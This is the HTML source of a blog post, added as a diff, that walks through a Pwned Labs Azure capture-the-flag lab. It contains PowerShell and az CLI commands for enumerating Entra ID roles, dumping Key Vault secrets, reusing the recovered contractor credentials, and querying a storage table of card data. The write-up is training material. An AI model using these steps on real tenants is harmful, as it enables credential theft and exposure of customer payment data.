@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Unlock Access with Azure Key Vault | SecFortress</title>
+<meta name="keywords" content="Azure, Red Teaming, Entra-ID, Powershell">
+<meta name="description" content="Explore how Azure Key Vault securely stores and manages secrets, keys, and certificates, and how misconfigurations can lead to the retrieval of sensitive information">
+<meta name="author" content="SecFortress">
+<link rel="canonical" href="http://localhost:1313/hacking/unlock_access_with_azure_key_vault/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/hacking/unlock_access_with_azure_key_vault/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><meta property="og:url" content="http://localhost:1313/hacking/unlock_access_with_azure_key_vault/">
+  <meta property="og:site_name" content="SecFortress">
+  <meta property="og:title" content="Unlock Access with Azure Key Vault">
+  <meta property="og:description" content="Explore how Azure Key Vault securely stores and manages secrets, keys, and certificates, and how misconfigurations can lead to the retrieval of sensitive information">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="hacking">
+    <meta property="article:published_time" content="2024-10-01T11:13:09+01:00">
+    <meta property="article:modified_time" content="2024-10-01T11:13:09+01:00">
+    <meta property="article:tag" content="Azure">
+    <meta property="article:tag" content="Red Teaming">
+    <meta property="article:tag" content="Entra-ID">
+    <meta property="article:tag" content="Powershell">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Unlock Access with Azure Key Vault">
+<meta name="twitter:description" content="Explore how Azure Key Vault securely stores and manages secrets, keys, and certificates, and how misconfigurations can lead to the retrieval of sensitive information">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Hackings",
+      "item": "http://localhost:1313/hacking/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Unlock Access with Azure Key Vault",
+      "item": "http://localhost:1313/hacking/unlock_access_with_azure_key_vault/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Unlock Access with Azure Key Vault",
+  "name": "Unlock Access with Azure Key Vault",
+  "description": "Explore how Azure Key Vault securely stores and manages secrets, keys, and certificates, and how misconfigurations can lead to the retrieval of sensitive information",
+  "keywords": [
+    "Azure", "Red Teaming", "Entra-ID", "Powershell"
+  ],
+  "articleBody": "Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.\nLab Link : https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault\nOverview After successfully compromising the Azure user account marcus@megabigtech.com and gaining access to their cloud environment, Mega Big Tech have asked us to see how far we can penetrate into the cloud environment, and if we can access any confidential data. Specifically they need us to assess the security of resources associated with the Azure Subscription ID “ceff06cb-e29d-4486-a3ae-eaaec5689f94”.\nSetting Up Tools needed for this lab :\nPowerShell Azure CLI Microsoft Graph PowerShell SDK We need to enable tab completion in pwsh on Kali for faster command entry and navigation through available cmdlets and parameters.\nRunning “mousepad $profile” on the command line this should open up the powershell config file located at /home/sec-fortress/.config/powershell/Microsoft.PowerShell_profile.ps1 Register-ArgumentCompleter -Native -CommandName az -ScriptBlock { param($commandName, $wordToComplete, $cursorPosition) $completion_file = New-TemporaryFile $env:ARGCOMPLETE_USE_TEMPFILES = 1 $env:_ARGCOMPLETE_STDOUT_FILENAME = $completion_file $env:COMP_LINE = $wordToComplete $env:COMP_POINT = $cursorPosition $env:_ARGCOMPLETE = 1 $env:_ARGCOMPLETE_SUPPRESS_SPACE = 0 $env:_ARGCOMPLETE_IFS = \"`n\" $env:_ARGCOMPLETE_SHELL = 'powershell' az 2\u003e\u00261 | Out-Null Get-Content $completion_file | Sort-Object | ForEach-Object { [System.Management.Automation.CompletionResult]::new($_, $_, \"ParameterValue\", $_) } Remove-Item $completion_file, Env:\\_ARGCOMPLETE_STDOUT_FILENAME, Env:\\ARGCOMPLETE_USE_TEMPFILES, Env:\\COMP_LINE, Env:\\COMP_POINT, Env:\\_ARGCOMPLETE, Env:\\_ARGCOMPLETE_SUPPRESS_SPACE, Env:\\_ARGCOMPLETE_IFS, Env:\\_ARGCOMPLETE_SHELL } Set-PSReadlineKeyHandler -Key Tab -Function MenuComplete WalkThrough For this lab the following authentication details where provided :\nIAM user : marcus@megabigtech.com Password : [REDACTED] Login Portal : https://portal.azure.com/ We can go ahead and login as the user marcus using the below command\naz login # Input Email and Password on the prompted browser Then to confirm that that we are in the execution context of the user we logged in as run the following command\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az account show { \"environmentName\": \"AzureCloud\", \"homeTenantId\": \"2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx\", \"id\": \"ceff06cb-e29d-4486-a3ae-eaaec5689f94\", \"isDefault\": true, \"managedByTenants\": [], \"name\": \"Microsoft Azure Sponsorship\", \"state\": \"Enabled\", \"tenantDefaultDomain\": \"megabigtech.com\", \"tenantDisplayName\": \"Default Directory\", \"tenantId\": \"2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx\", \"user\": { \"name\": \"marcus@megabigtech.com\", \"type\": \"user\" } } The next command allows us to get a Microsoft Graph session as current user.\nInstall-Module Microsoft.Graph # Install module Import-Module Microsoft.Graph.Users # Import module Connect-MgGraph Install-Module Az # Install module Import-Module Az # Import module Connect-AzAccount Note:\nThe Connect-AzAccount command logs you into your Azure account, allowing you to manage and interact with your Azure resources via PowerShell.\nThe Connect-MgGraph command logs you into Microsoft Graph, enabling you to interact with and manage Microsoft 365 services and data (like users, groups, and mail) via PowerShell.\nWe can then use the below command to show information about our current logged in user just as the whoami command in linux\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az ad signed-in-user show { \"@odata.context\": \"https://graph.microsoft.com/v1.0/$metadata#users/$entity\", \"businessPhones\": [], \"displayName\": \"Marcus Hutch\", \"givenName\": \"Marcus\", \"id\": \"41c178d3-c246-4c00-98f0-8113bd631676\", \"jobTitle\": \"Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\", \"mail\": null, \"mobilePhone\": null, \"officeLocation\": null, \"preferredLanguage\": null, \"surname\": \"Hutch\", \"userPrincipalName\": \"marcus@megabigtech.com\" } it is possible to get the group membership of the user by running the following command. PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-MgUserMemberOf -userid \"marcus@megabigtech.com\" | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\"displayName\"]} $_.AdditionalProperties[\"displayName\"] -------------------------------------- Directory Readers Default Directory All Company As shown in the above output every member of the Directory Readers group is allowed to enumerate Entra ID. Since we have permission, It is also important to enumerate further permissions to see if this user can access other Azure resources :\n# Given subscription ID $CurrentSubscriptionID = \"ceff06cb-e29d-4486-a3ae-eaaec5689f94\" # Set output format $OutputFormat = \"table\" # Set the given subscription as the active one \u0026 az account set --subscription $CurrentSubscriptionID # List resources in the current subscription \u0026 az resource list -o $OutputFormat The below output tells us that the Azure Key Vault named ext-contractors contains a Key Vault (Microsoft.KeyVault/vaults). This makes the resource group highly sensitive because Azure Key Vaults are typically used to store:\nSecrets: Sensitive data such as passwords, API keys, tokens, or database connection strings. Encryption Keys: Used to encrypt/decrypt data, such as files or databases. Certificates: SSL/TLS certificates or other authentication-related certificates. We can then go ahead and check what’s inside the key vault with the below script. Make sure to replace the $VaultName and $SubscriptionID on your own personal engagement.\n# Set variables $VaultName = \"ext-contractors\" # Set the current Azure subscription $SubscriptionID = \"ceff06cb-e29d-4486-a3ae-eaaec5689f94\" az account set --subscription $SubscriptionID # List and store the secrets $secretsJson = az keyvault secret list --vault-name $VaultName -o json $secrets = $secretsJson | ConvertFrom-Json # List and store the keys $keysJson = az keyvault key list --vault-name $VaultName -o json $keys = $keysJson | ConvertFrom-Json # Output the secrets Write-Host \"Secrets in vault $VaultName\" foreach ($secret in $secrets) { Write-Host $secret.id } # Output the keys Write-Host \"Keys in vault $VaultName\" foreach ($key in $keys) { Write-Host $key.id } The below output indicates that the ext-contractors vault contains secrets, and in addition to secrets, keys and certificates may also be stored in the same Key Vault. Azure Key Vault is designed to securely store secrets, encryption keys, and certificates, so it’s common to find all three types of data objects within a single vault.\nAlso take note that, Contractor and consultant accounts often have high privileges due to their temporary nature, making them prime targets for penetration testers and red teamers.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e ./keyvaultenum.ps1 Secrets in vault ext-contractors https://ext-contractors.vault.azure.net/secrets/alissa-suarez https://ext-contractors.vault.azure.net/secrets/josh-harvey https://ext-contractors.vault.azure.net/secrets/ryan-garcia Keys in vault ext-contractors We then need to see what we have in each of this Key Vault entries, Also make sure to replace the $VaultName, $SecretNames and $SubscriptionID in an engagement to get valid output.\n# Set variables $VaultName = \"ext-contractors\" $SecretNames = @(\"alissa-suarez\", \"josh-harvey\", \"ryan-garcia\") # Set the current Azure subscription $SubscriptionID = \"ceff06cb-e29d-4486-a3ae-eaaec5689f94\" az account set --subscription $SubscriptionID # Retrieve and output the secret values Write-Host \"Secret Values from vault $VaultName\" foreach ($SecretName in $SecretNames) { $secretValueJson = az keyvault secret show --name $SecretName --vault-name $VaultName -o json $secretValue = ($secretValueJson | ConvertFrom-Json).value Write-Host \"$SecretName - $secretValue\" } As shown below the credentials for the three users where retrieved ;\nIt is also possible to enumerate all of this via the “Azure Portal” By clicking “All resources” on the portal or using the search bar with the specified search term.\nClick on the ext-contractors resource\nUnder objects \u003e Secrets, you should find all user objects\nIt’s good practice to verify if the retrieved users are still active, enabled, or even exist in Entra ID or that they have the same password set, as password reuse is a very common bad practice.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az ad user list --query \"[?givenName=='Alissa' || givenName=='Josh' || givenName=='Ryan'].{Name:displayName, UPN:userPrincipalName, JobTitle:jobTitle}\" -o table Name UPN JobTitle ------------------------ ------------------------------- ------------------------------------------ Josh Harvey (Consultant) ext.josh.harvey@megabigtech.com Consultant (Customer DB Migration Project) The above result shows that the Josh Harvey contractor account is still available. We can go ahead and enumerate this account further.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-MgUser -UserId ext.josh.harvey@megabigtech.com DisplayName Id Mail UserPrincipalName ----------- -- ---- ----------------- Josh Harvey (Consultant) 6470f625-41ce-4233-a621-fad0aa0b7300 ext.josh.harvey@megabigtech.com With the above Id value we can query for groups that this user belongs to :\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-MgUserMemberOf -userid $userid | select * -ExpandProperty additionalProperties | Select-Object {$_.AdditionalProperties[\"displayName\"]} $_.AdditionalProperties[\"displayName\"] -------------------------------------- CUSTOMER-DATABASE-ACCESS Directory Readers Default Directory We see that the user Josh belongs to the CUSTOMER-DATABASE-ACCESS group as shown above, we can go ahead and query this group to see what we have :\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-MgGroup -Filter \"displayName eq 'CUSTOMER-DATABASE-ACCESS'\" DisplayName Id MailNickname Description GroupTypes ----------- -- ------------ ----------- ---------- CUSTOMER-DATABASE-ACCESS 79b430a5-ea4d-4de6-855b-908bdfb052dc 6e69ec6a-6 Provides full read-only access to the Mega Big Tech customer list and customer information {} From the above output, members of this group can access the Mega Big Tech customer list…, taking our enumeration further, Let’s see what permissions are assigned.\nHowever I noticed that there are not so many permissions in the above output since we are still logged in as user marcus. So Log out of the current session using az logout and Disconnect-AzAccount, then log back in with az login and Connect-AzAccount to try accessing the Josh Harvey account with the Key Vault credentials we got earlier.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e Get-AzRoleAssignment -Scope \"/subscriptions/ceff06cb-e29d-4486-a3ae-eaaec5689f94\" | Select-Object DisplayName, RoleDefinitionName DisplayName RoleDefinitionName ----------- ------------------ Ian Austin Key Vault Administrator Marcus Hutch Key Vault Reader Marcus Hutch Key Vault Secrets User Josh Harvey (Consultant) Reader CUSTOMER-DATABASE-ACCESS Customer Database Access IT-HELPDESK Reader Security User Storage Blob Data Reader Security User Reader Azure Security Insights Microsoft Sentinel Automation Contributor c7bf3d89f766471691ccdf29 Log Analytics Contributor c7bf3d89f766471691ccdf29 Monitoring Contributor c7bf3d89f766471691ccdf29 Monitoring Contributor c7bf3d89f766471691ccdf29 Log Analytics Contributor 014b118fb59f4ef59faa8c63 Monitoring Contributor 014b118fb59f4ef59faa8c63 Log Analytics Contributor 014b118fb59f4ef59faa8c63 Monitoring Contributor 014b118fb59f4ef59faa8c63 Log Analytics Contributor f2dde2b466f240afa614abbc Log Analytics Contributor f2dde2b466f240afa614abbc Monitoring Contributor b047e83f402747fd8797e1ff Monitoring Contributor b047e83f402747fd8797e1ff Log Analytics Contributor 0f7ef2ab65244e72925a57e4 Monitoring Contributor 0f7ef2ab65244e72925a57e4 Monitoring Contributor 0f7ef2ab65244e72925a57e4 Log Analytics Contributor 0f7ef2ab65244e72925a57e4 Log Analytics Contributor f41ed7dd9122452585bcc1ff Monitoring Contributor f41ed7dd9122452585bcc1ff Log Analytics Contributor 1ae7323ccead497685d1c18a Log Analytics Contributor 1ae7323ccead497685d1c18a Monitoring Contributor 57d7395f82fe4a2593d003b4 Monitoring Contributor 57d7395f82fe4a2593d003b4 Log Analytics Contributor 57d7395f82fe4a2593d003b4 Log Analytics Contributor 57d7395f82fe4a2593d003b4 Monitoring Contributor 9f9dcd98a3a74c7a9b2abace Monitoring Contributor 9f9dcd98a3a74c7a9b2abace Log Analytics Contributor Clara Miller Reader dbuser Reader According to the above output the user Josh Harvey has been assigned the Reader role. The Reader role in Azure grants read-only access to resources but does not allow modification or access to sensitive data like Key Vault contents or databases.\nWe also see that CUSTOMER-DATABASE-ACCESS group has been assigned the Customer Database Access role so let enumerate that.\naz role definition list --custom-role-only true --query \"[?roleName=='Customer Database Access']\" -o json The above output shows that the group gives members the ability to list storage tables and their values! The Azure Storage Tables are a NoSQL data store for large, structured, non-relational data, part of Azure Storage services alongside Blob, File, and Queue Storage.\"\nWe then start by listing the storage accounts in the current Azure subscription in plain text format (TSV) with the below command.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az storage account list --query \"[].name\" -o tsv custdatabase mbtwebsite securityconfigs Then we can Issue the following command below to see if any storage tables exist in any of this storage accounts\naz storage table list --account-name \u003cstorage_account\u003e --output table --auth-mode login According to the above output only the custdatabase storage account has a storage table named customers , We can then go ahead and query this storage table leading to the disclosure of sensitive information such as payment data.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u003e az storage entity query --table-name customers --account-name custdatabase --output table --auth-mode login PartitionKey RowKey Card_expiry Card_number Customer_id Customer_name Cvv -------------- -------- ------------- ---------------- ------------------------------------ -------------------------------------- ----- 1 1 10/30 5425233430109903 07244ad0-c228-43d8-a48e-1846796aa6ad SecureBank Holdings 543 1 10 01/30 4347866885036101 cba21bec-7e8d-4394-a145-ea7f6131a998 InnoVenture 781 1 2 09/29 4012000033330026 66d7a744-5eb6-4b1b-9e70-a36824366534 NeuraHealth 452 1 3 05/31 4657490028942036 6a88c0ff-b79c-4842-92f1-f25d53c5cbe4 DreamScreen Entertainment 683 1 4 01/29 4657493919180161 14fb331d-a82e-41f8-8f20-d630f312dd3e InfiNet Solutions 855 1 5 08/29 4657490203402673 cdf53341-b806-4f69-a1e2-7b632b1d405d Skyward Aerospace 344 1 6 12/30 4594045518310163 c6e6418b-fc4e-4f7b-a463-1a3bc6551cd3 Quasar Analytics Inc 145 1 7 02/29 4594055970518286 fc4f9042-5b94-4a79-b18a-40fa621fe2e1 DataGuard Inc 243 1 8 06/30 4698558990398121 07a2cfae-16de-41a9-af51-b9cd9f077800 Huge Logistics 546 1 9 03/30 4698559508013566 512df22d-815f-4f98-92af-a615a92ea39d SmartMove Robotics 992 1 99 Flag: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx Have fun ⋆.˚ ᡣ𐭩 .𖥔˚\nKey Takeaways Azure Key Vault is a critical service for securely storing and managing sensitive information like secrets, keys, and certificates.\nBy centralizing secrets in the Key Vault, you reduce the risk of exposure and ensure tighter control over access. Role-based access control (RBAC) and Access Policies help limit access to only authorized users and services.\nRegular auditing and rotating of secrets enhances security, minimizing potential breaches.\nImplementing the Principle of Least Privilege ensures that only necessary permissions are granted, reducing attack surfaces.\n",
+  "wordCount" : "1888",
+  "inLanguage": "en",
+  "datePublished": "2024-10-01T11:13:09+01:00",
+  "dateModified": "2024-10-01T11:13:09+01:00",
+  "author":{
+    "@type": "Person",
+    "name": "SecFortress"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/hacking/unlock_access_with_azure_key_vault/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "SecFortress",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="SecFortress (Alt + H)">
+                <img src="http://localhost:1313/images/avatar.jpeg" alt="" aria-label="logo"
+                    height="25">SecFortress</a>
+            <div class="logo-switches">
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/hacking" title="🥷 Hacking">
+                    <span>🥷 Hacking</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://sec-fortress.github.io/" title="✍️ Notes">
+                    <span>✍️ Notes</span>&nbsp;
+                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
+                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
+                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
+                        <path d="M15 3h6v6"></path>
+                        <path d="M10 14L21 3"></path>
+                    </svg>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/whoami" title="🇳🇬 Whoami">
+                    <span>🇳🇬 Whoami</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/hacking/">Hackings</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Unlock Access with Azure Key Vault
+    </h1>
+    <div class="post-description">
+      Explore how Azure Key Vault securely stores and manages secrets, keys, and certificates, and how misconfigurations can lead to the retrieval of sensitive information
+    </div>
+    <div class="post-meta"><span title='2024-10-01 11:13:09 +0100 WAT'>October 1, 2024</span>&nbsp;·&nbsp;<span>9 min</span>&nbsp;·&nbsp;<span>SecFortress</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#overview"><strong>Overview</strong></a></li>
+    <li><a href="#setting-up"><strong>Setting Up</strong></a></li>
+    <li><a href="#walkthrough"><strong>WalkThrough</strong></a></li>
+    <li><a href="#key-takeaways"><strong>Key Takeaways</strong></a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><strong>Note : This article was inspired by content from Pwned Labs. Special thanks to Pwned Labs for providing insightful resources and awesome learning experience for learners.</strong></p>
+<p><strong>Lab Link :</strong> <a href="https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault">https://pwnedlabs.io/labs/unlock-access-with-azure-key-vault</a></p>
+<h2 id="overview"><strong>Overview</strong><a hidden class="anchor" aria-hidden="true" href="#overview">#</a></h2>
+<p>After successfully compromising the Azure user account <code>marcus@megabigtech.com</code> and gaining access to their cloud environment, Mega Big Tech have asked us to see how far we can penetrate into the cloud environment, and if we can access any confidential data. Specifically they need us to assess the security of resources associated with the Azure Subscription ID &ldquo;<code>ceff06cb-e29d-4486-a3ae-eaaec5689f94</code>&rdquo;.</p>
+<p><img loading="lazy" src="https://i.pinimg.com/originals/d8/82/8d/d8828d2d6254273a617e6337d292303d.gif#center"></p>
+<h2 id="setting-up"><strong>Setting Up</strong><a hidden class="anchor" aria-hidden="true" href="#setting-up">#</a></h2>
+<p>Tools needed for this lab :</p>
+<ul>
+<li><a href="https://learn.microsoft.com/en-us/powershell/scripting/install/installing-powershell">PowerShell</a></li>
+<li><a href="https://learn.microsoft.com/en-us/cli/azure/install-azure-cli">Azure CLI</a> </li>
+<li><a href="https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation?view=graph-powershell-1.0">Microsoft Graph PowerShell SDK</a></li>
+</ul>
+<p>We need to enable tab completion in <code>pwsh</code> on  Kali for faster command entry and navigation through available cmdlets and parameters.</p>
+<ul>
+<li>Running &ldquo;<code>mousepad $profile</code>&rdquo; on the command line this should open up the powershell config file located at <code>/home/sec-fortress/.config/powershell/Microsoft.PowerShell_profile.ps1</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Register-ArgumentCompleter</span> <span class="n">-Native</span> <span class="n">-CommandName</span> <span class="n">az</span> <span class="n">-ScriptBlock</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">param</span><span class="p">(</span><span class="nv">$commandName</span><span class="p">,</span> <span class="nv">$wordToComplete</span><span class="p">,</span> <span class="nv">$cursorPosition</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$completion_file</span> <span class="p">=</span> <span class="nb">New-TemporaryFile</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:ARGCOMPLETE_USE_TEMPFILES</span> <span class="p">=</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:_ARGCOMPLETE_STDOUT_FILENAME</span> <span class="p">=</span> <span class="nv">$completion_file</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:COMP_LINE</span> <span class="p">=</span> <span class="nv">$wordToComplete</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:COMP_POINT</span> <span class="p">=</span> <span class="nv">$cursorPosition</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:_ARGCOMPLETE</span> <span class="p">=</span> <span class="mf">1</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:_ARGCOMPLETE_SUPPRESS_SPACE</span> <span class="p">=</span> <span class="mf">0</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:_ARGCOMPLETE_IFS</span> <span class="p">=</span> <span class="s2">&#34;</span><span class="se">`n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$env:_ARGCOMPLETE_SHELL</span> <span class="p">=</span> <span class="s1">&#39;powershell&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">az</span> <span class="mf">2</span><span class="p">&gt;&amp;</span><span class="mf">1</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Get-Content</span> <span class="nv">$completion_file</span> <span class="p">|</span> <span class="nb">Sort-Object</span> <span class="p">|</span> <span class="nb">ForEach-Object</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="no">System.Management.Automation.CompletionResult</span><span class="p">]::</span><span class="n">new</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span> <span class="nv">$_</span><span class="p">,</span> <span class="s2">&#34;ParameterValue&#34;</span><span class="p">,</span> <span class="nv">$_</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">Remove-Item</span> <span class="nv">$completion_file</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">_ARGCOMPLETE_STDOUT_FILENAME</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">ARGCOMPLETE_USE_TEMPFILES</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">COMP_LINE</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">COMP_POINT</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">_ARGCOMPLETE</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">_ARGCOMPLETE_SUPPRESS_SPACE</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">_ARGCOMPLETE_IFS</span><span class="p">,</span> <span class="n">Env</span><span class="err">:</span><span class="p">\</span><span class="n">_ARGCOMPLETE_SHELL</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">Set-PSReadlineKeyHandler</span> <span class="n">-Key</span> <span class="n">Tab</span> <span class="n">-Function</span> <span class="n">MenuComplete</span>
+</span></span></code></pre></div><h2 id="walkthrough"><strong>WalkThrough</strong><a hidden class="anchor" aria-hidden="true" href="#walkthrough">#</a></h2>
+<p>For this lab the following authentication details where provided :</p>
+<pre tabindex="0"><code>IAM user : marcus@megabigtech.com
+Password : [REDACTED]
+Login Portal : https://portal.azure.com/
+</code></pre><p>We can go ahead and login as the user <code>marcus</code> using the below command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">az</span> <span class="n">login</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Input Email and Password on the prompted browser</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/3Po6AaW.png"></p>
+<p>Then to confirm that that we are in the execution context of the user we logged in as run the following command</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="n">az</span> <span class="n">account</span> <span class="n">show</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;environmentName&#34;</span><span class="err">:</span> <span class="s2">&#34;AzureCloud&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;homeTenantId&#34;</span><span class="err">:</span> <span class="s2">&#34;2590ccef-687d-493b-ae8d-xxxxxxxxxxxxxxxxxx&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;id&#34;</span><span class="err">:</span> <span class="s2">&#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;isDefault&#34;</span><span class="err">:</span> <span class="n">true</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;managedByTenants&#34;</span><span class="err">:</span> <span class="p">[],</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;name&#34;</span><span class="err">:</span> <span class="s2">&#34;Microsoft Azure Sponsorship&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;state&#34;</span><span class="err">:</span> <span class="s2">&#34;Enabled&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantDefaultDomain&#34;</span><span class="err">:</span> <span class="s2">&#34;megabigtech.com&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tenantDisplayName&#34;</span><span class="err">:</span> <span class="s2">&#34;Default Directory&#34;</span><span class="p">,</span>
